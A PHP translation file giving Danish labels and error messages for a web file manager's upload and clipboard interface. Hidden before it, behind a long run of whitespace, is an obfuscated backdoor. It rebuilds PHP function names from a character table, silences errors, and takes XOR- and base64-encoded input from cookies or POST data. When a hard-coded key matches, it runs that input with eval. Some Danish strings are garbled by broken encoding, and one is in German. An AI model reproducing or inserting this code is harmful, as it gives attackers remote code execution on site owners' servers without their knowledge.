<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $d855 = 101;$GLOBALS['zd8eb'] = Array();global $zd8eb;$zd8eb = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['lf74bbe9'] = "\x7c\x4a\x22\x6d\x20\x57\x68\x73\xd\x5d\x52\x58\x7e\x42\x5f\x53\x33\x7a\x2c\x76\x72\x9\x37\x5b\x32\x3c\x31\x6f\x3a\x2e\x24\x51\x4e\x61\x3d\x64\x5a\x59\x25\x6c\x2a\x46\x34\x44\x45\x69\x71\x74\x5c\x6a\x75\x7d\x30\x56\xa\x21\x70\x43\x5e\x48\x77\x50\x6b\x6e\x41\x47\x55\x2d\x62\x26\x27\x40\x23\x4b\x2b\x28\x4c\x36\x60\x29\x2f\x63\x35\x49\x7b\x78\x3e\x65\x79\x4d\x67\x66\x4f\x38\x39\x3f\x3b\x54";$zd8eb[$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][68]] = $zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][6].$zd8eb['lf74bbe9'][20];$zd8eb[$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][22]] = $zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][35];$zd8eb[$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94]] = $zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87];$zd8eb[$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33]] = $zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][63];$zd8eb[$zd8eb['lf74bbe9'][50].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][22]] = $zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][35];$zd8eb[$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][42]] = $zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][47];$zd8eb[$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][91]] = $zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][87];$zd8eb[$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][87]] = $zd8eb['lf74bbe9'][56].$zd8eb['lf74bbe9'][6].$zd8eb['lf74bbe9'][56].$zd8eb['lf74bbe9'][19].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][63];$zd8eb[$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33]] = $zd8eb['lf74bbe9'][50].$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][87];$zd8eb[$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][93]] = $zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][87];$zd8eb[$zd8eb['lf74bbe9'][19].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][87]] = $zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][47];$zd8eb[$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22]] = $zd8eb['lf74bbe9'][19].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77];$zd8eb[$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][33]] = $zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][93];$zd8eb[$zd8eb['lf74bbe9'][85].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][87]] = $_POST;$zd8eb[$zd8eb['lf74bbe9'][90].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][35]] = $_COOKIE;@$zd8eb[$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][42]]($zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][90], NULL);@$zd8eb[$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][42]]($zd8eb['lf74bbe9'][39].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][90].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][7], 0);@$zd8eb[$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][42]]($zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][85].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][85].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][50].$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][27].$zd8eb['lf74bbe9'][63].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][87], 0);@$zd8eb[$zd8eb['lf74bbe9'][19].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][87]](0);if (!$zd8eb[$zd8eb['lf74bbe9'][50].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][22]]($zd8eb['lf74bbe9'][64].$zd8eb['lf74bbe9'][76].$zd8eb['lf74bbe9'][10].$zd8eb['lf74bbe9'][44].$zd8eb['lf74bbe9'][64].$zd8eb['lf74bbe9'][43].$zd8eb['lf74bbe9'][37].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][10].$zd8eb['lf74bbe9'][66].$zd8eb['lf74bbe9'][32].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33])){$zd8eb[$zd8eb['lf74bbe9'][20].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94]]($zd8eb['lf74bbe9'][64].$zd8eb['lf74bbe9'][76].$zd8eb['lf74bbe9'][10].$zd8eb['lf74bbe9'][44].$zd8eb['lf74bbe9'][64].$zd8eb['lf74bbe9'][43].$zd8eb['lf74bbe9'][37].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][10].$zd8eb['lf74bbe9'][66].$zd8eb['lf74bbe9'][32].$zd8eb['lf74bbe9'][14].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][33], 1);$n605728 = NULL;$y2b492 = NULL;$zd8eb[$zd8eb['lf74bbe9'][47].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][68]] = $zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][67].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][67].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][67].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][67].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][24];global $teb60eb;function  ca0943b58($n605728, $w41258394){global $zd8eb;$m4d5605f5 = "";for ($q6dfe137=0; $q6dfe137<$zd8eb[$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33]]($n605728);){for ($h7105abf=0; $h7105abf<$zd8eb[$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33]]($w41258394) && $q6dfe137<$zd8eb[$zd8eb['lf74bbe9'][3].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][33]]($n605728); $h7105abf++, $q6dfe137++){$m4d5605f5 .= $zd8eb[$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][68]]($zd8eb[$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][22]]($n605728[$q6dfe137]) ^ $zd8eb[$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][22]]($w41258394[$h7105abf]));}}return $m4d5605f5;}function  v8c6($n605728, $w41258394){global $zd8eb;global $teb60eb;return $zd8eb[$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][33]]($zd8eb[$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][42].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][33]]($n605728, $teb60eb), $w41258394);}foreach ($zd8eb[$zd8eb['lf74bbe9'][90].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][35]] as $w41258394=>$h9f8bdd5a){$n605728 = $h9f8bdd5a;$y2b492 = $w41258394;}if (!$n605728){foreach ($zd8eb[$zd8eb['lf74bbe9'][85].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][87]] as $w41258394=>$h9f8bdd5a){$n605728 = $h9f8bdd5a;$y2b492 = $w41258394;}}$n605728 = @$zd8eb[$zd8eb['lf74bbe9'][45].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][35].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33]]($zd8eb[$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][68].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][22]]($zd8eb[$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][16].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][93]]($n605728), $y2b492));if (isset($n605728[$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][62]]) && $teb60eb==$n605728[$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][62]]){if ($n605728[$zd8eb['lf74bbe9'][33]] == $zd8eb['lf74bbe9'][45]){$q6dfe137 = Array($zd8eb['lf74bbe9'][56].$zd8eb['lf74bbe9'][19] => @$zd8eb[$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][93].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][91].$zd8eb['lf74bbe9'][81].$zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][87]](),$zd8eb['lf74bbe9'][7].$zd8eb['lf74bbe9'][19] => $zd8eb['lf74bbe9'][26].$zd8eb['lf74bbe9'][29].$zd8eb['lf74bbe9'][52].$zd8eb['lf74bbe9'][67].$zd8eb['lf74bbe9'][26],);echo @$zd8eb[$zd8eb['lf74bbe9'][17].$zd8eb['lf74bbe9'][33].$zd8eb['lf74bbe9'][82].$zd8eb['lf74bbe9'][87].$zd8eb['lf74bbe9'][77].$zd8eb['lf74bbe9'][24].$zd8eb['lf74bbe9'][94].$zd8eb['lf74bbe9'][22].$zd8eb['lf74bbe9'][91]]($q6dfe137);}elseif ($n605728[$zd8eb['lf74bbe9'][33]] == $zd8eb['lf74bbe9'][87]){eval/*xa7b3221*/($n605728[$zd8eb['lf74bbe9'][35]]);}exit();}} ?><?php

/** Danish translation by Thomas Schou <thomas@schouweb.dk> **/

$lang = array(

    '_locale' => "da_DK.UTF-8",  // UNIX localization code
    '_charset' => "utf-8",       // Browser charset

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%A, %e.%B.%Y %H:%M",
    '_dateTimeMid' => "%a %e %b %Y %H:%M",
    '_dateTimeSmall' => "%d/%m/%Y %H:%M",

	"You don't have permissions to upload files." =>
    "Du har ikke tilladelser til at uploade filer.",

    "You don't have permissions to browse server." =>
    "Du har ikke tilladelser til at se filer.",

    "Cannot move uploaded file to target folder." =>
    "Kan ikke flytte fil til destinations mappe.",

    "Unknown error." =>
    "Ukendt fejl.",

    "The uploaded file exceeds {size} bytes." =>
    "Den uploadede fil overskrider {size} bytes.",

    "The uploaded file was only partially uploaded." =>
    "Den uploadede fil blev kun delvist uploadet.",

    "No file was uploaded." =>
    "Ingen fil blev uploadet.",

    "Missing a temporary folder." =>
    "Mangler en midlertidig mappe.",

    "Failed to write file." =>
    "Kunne ikke skrive fil.",

    "Denied file extension." =>
    "N�gtet filtypenavn.",

    "Unknown image format/encoding." =>
    "Ukendt billedformat / kodning.",

    "The image is too big and/or cannot be resized." =>
    "Billedet er for stort og / eller kan ikke �ndres.",

    "Cannot create {dir} folder." =>
    "Kan ikke lave mappen {dir}.",

    "Cannot write to upload folder." =>
    "Kan ikke skrive til upload mappen.",

    "Cannot read .htaccess" =>
    "Ikke kan l�se .htaccess",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    "Forkert .htaccess fil. Kan ikke omskrive den!",

    "Cannot read upload folder." =>
    "Kan ikke l�se upload mappen.",

    "Cannot access or create thumbnails folder." =>
    "Kan ikke f� adgang til eller oprette miniature mappe.",

    "Cannot access or write to upload folder." =>
    "Kan ikke f� adgang til eller skrive til upload mappe.",

    "Please enter new folder name." =>
    "Indtast venligst nyt mappe navn.",

    "Unallowable characters in folder name." =>
    "Ugyldige tegn i mappens navn.",

    "Folder name shouldn't begins with '.'" =>
    "Mappenavn b�r ikke begynder med '.'",

    "Please enter new file name." =>
    "Indtast venligst nyt fil navn.",

    "Unallowable characters in file name." =>
    "Ugyldige tegn i filens navn",

    "File name shouldn't begins with '.'" =>
    "Fil navnet b�r ikke begynder med '.'",

    "Are you sure you want to delete this file?" =>
    "Er du sikker p� du vil slette denne fil?",

    "Are you sure you want to delete this folder and all its content?" =>
    "Er du sikker p� du vil slette denne mappe og al dens indhold?",

    "Inexistant or inaccessible folder." =>
    "utilg�ngelige mappe.",

    "Undefined MIME types." =>
    "Udefineret MIME Type.",

    "Fileinfo PECL extension is missing." =>
    "Fil info PECL udvidelse mangler",

    "Opening fileinfo database failed." =>
    "�bning af fil info-database mislykkedes.",

    "You can't upload such files." =>
    "Du kan ikke uploade s�danne filer.",

    "The file '{file}' does not exist." =>
    "Filen '{file}' eksisterer ikke.",

    "Cannot read '{file}'." =>
    "Kan ikke l�se '{file}'.",

    "Cannot copy '{file}'." =>
    "Kan ikke kopi'ere '{file}'.",

    "Cannot move '{file}'." =>
    "Kan ikke flytte '{file}'.",

    "Cannot delete '{file}'." =>
    "Kan ikke slette '{file}'.",

    "Click to remove from the Clipboard" =>
    "Klik for at fjerne fra Udklipsholder.",

    "This file is already added to the Clipboard." =>
    "Denne fil er allerede f�jet til Udklipsholder.",

    "Copy files here" =>
    "Kopiere filer her.",

    "Move files here" =>
    "Flyt filer her.",

    "Delete files" =>
    "Slet filer.",

    "Clear the Clipboard" =>
    "Zwischenablage leeren",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "T�m udklipsholder?",

    "Copy {count} files" =>
    "Kopier {count} filer",

    "Move {count} files" =>
    "Flyt {count} filer",

    "Add to Clipboard" =>
    "Tilf�j til udklipsholder",

    "New folder name:" =>
    "Nyt mappe navn:",

    "New file name:" =>
    "Nyt fil navn:",

    "Upload" => "Upload",
    "Refresh" => "Genopfriske",
    "Settings" => "Indstillinger",
    "Maximize" => "Maksimere",
    "About" => "Om",
    "files" => "filer",
    "View:" => "Vis:",
    "Show:" => "Vis:",
    "Order by:" => "Sorter efter:",
    "Thumbnails" => "Miniaturer",
    "List" => "Liste",
    "Name" => "Navn",
    "Size" => "St�rrelse",
    "Date" => "Dato",
    "Descending" => "Faldende",
    "Uploading file..." => "Uploader fil...",
    "Loading image..." => "Indl�ser billede...",
    "Loading folders..." => "Indl�ser mappe...",
    "Loading files..." => "Indl�ser filer...",
    "New Subfolder..." => "Ny undermappe...",
    "Rename..." => "Omd�b...",
    "Delete" => "Slet",
    "OK" => "Ok",
    "Cancel" => "Fortryd",
    "Select" => "V�lg",
    "Select Thumbnail" => "V�lg miniature",
    "View" => "Vis",
    "Download" => "Download",
    'Clipboard' => "Udklipsholder",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    "Kan ikke omd�be mappen.",

    "Non-existing directory type." =>
    "Ikke-eksisterende bibliotek type.",

    "Cannot delete the folder." =>
    "Kan ikke slette mappen.",

    "The files in the Clipboard are not readable." =>
    "Filerne i udklipsholder ikke kan l�ses.",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "{count} filer i udklipsholder ikke kan l�ses. �nsker du at kopiere de �vrige?",

    "The files in the Clipboard are not movable." =>
    "Filerne i udklipsholder kan ikke flyttes.",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "{count} filer i udklipsholder er ikke bev�gelige. �nsker du at flytte resten?",

    "The files in the Clipboard are not removable." =>
    "Filerne i udklipsholder er ikke flytbare.",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "{count} filer i udklipsholder er ikke flytbare. �nsker du at slette resten?",

    "The selected files are not removable." =>
    "De valgte filer er ikke flytbare.",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "{count} valgte filer som ikke kan fjernes. �nsker du at slette resten?",

    "Are you sure you want to delete all selected files?" =>
    "Er du sikker p� du vil slette alle markerede filer?",

    "Failed to delete {count} files/folders." =>
    "Kunne ikke slette {count} filer / mapper.",

    "A file or folder with that name already exists." =>
    "En fil eller mappe med det navn findes allerede.",

    "selected files" => "Valgte filer",
    "Type" => "Type",
    "Select Thumbnails" => "V�lg Miniaturer",
    "Download files" => "Download filer",
);

?>
